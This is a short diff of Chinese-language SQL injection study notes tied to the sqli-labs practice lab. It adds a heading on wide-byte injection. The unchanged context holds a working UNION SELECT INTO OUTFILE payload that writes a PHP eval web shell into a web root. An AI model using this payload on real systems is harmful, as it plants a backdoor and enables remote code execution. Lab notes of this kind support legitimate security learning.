@@ -253,4 +253,7 @@ post注入
  [?id=1' and 1=2 union select 1,'<?php @eval($_REQUEST[777]);?>',3 into outfile 'c:\\phpstudy\\www\\2.php' --+],直接传入参数，页面如果不报错，说明写入成功。可以直接访问写入的文件[http://localhost/1.php]
   into outfile
 
- 宽字节注入
+### 宽字节注入
+
+宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。
+sqli-lab 32
